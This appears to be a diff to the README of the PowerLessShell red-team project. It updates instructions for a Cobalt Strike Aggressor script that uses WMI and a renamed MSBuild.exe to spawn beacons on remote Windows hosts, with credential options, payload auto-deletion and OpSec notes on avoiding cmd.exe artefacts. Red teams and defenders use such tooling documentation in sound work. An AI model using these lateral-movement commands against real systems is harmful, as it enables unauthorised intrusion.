@@ -140,21 +140,36 @@ The following example is running the RC4 RAT https://github.com/Mr-Un1k0d3r/RC4-
 
 ![PowerLessShell](https://ringzer0team.com/powershellless.png)
 
-# Cobalt Strike Aggressor script (wmi_msbuild.cna) By MrT-F
+# Cobalt Strike Aggressor script (wmi_msbuild.cna) 
+By Alyssa (ramen0x3f) and MrT-F
+### Set Up
+* Either copy PowerLessShell folder to [cobalts working dir]/PowerLessShell or make note of path
+* If you didn't copy it to the Cobalt directory: edit the $pls_path variable in this file to point to PowerLessShell
+* Load script into Cobalt Strike
 
-cd into your cobalt strike client directory
+### Usage
 ```
-cd /root/cobaltstrike
+check_msbuild -target TARGET   		Verify .NET 4.0.30319 is installed (should see "Status OK")
+	[-user user] [-pass pass]		Windows 7 has .NET 4.0.30319 after 3 reboots and 4 Windows update cycles
+
+rename_msbuild -target TARGET 		Copy MSBuild.exe. 
+	-msbuild newname 
+ 	[-path C:\new\path] 		Default - C:\Users\Public\
+	[-user domain\username]		Specifying user/pass spawns cmd on remote host.
+ 	[-pass password]			
+
+wmi_msbuild -target TARGET 		 	Spawn new beacon. 
+         -listener LISTENER
+	[-payload new_file]		 	Default - [a-zA-Z].tmp
+	[-directory new_dir]			Default - C:\Users\Public\
+	[-msbuild alt_msbuild_location] 	
+	[-user USERNAME] [-pass PASSWORD]	
+	[-manualdelete]				Switch doesn't auto delete payload.
 ```
-Clone this repository into folder PowerLessShell
-```
-git clone https://github.com/Mr-Un1k0d3r/PowerLessShell.git
-```
-Load the aggressor script in your Cobalt Strike Console
-Laterally move just like other Cobalt Strike macros:
-```
-wmi_msbuild [target] [listener]
-```
+### OpSec Notes
+Spawns cmd.exe on the target system if
+* ManualDelete switch is not set
+* rename_msbuild is run with a username/password specified
 
 # Credit
 Mr.Un1k0d3r RingZer0 Team 2017
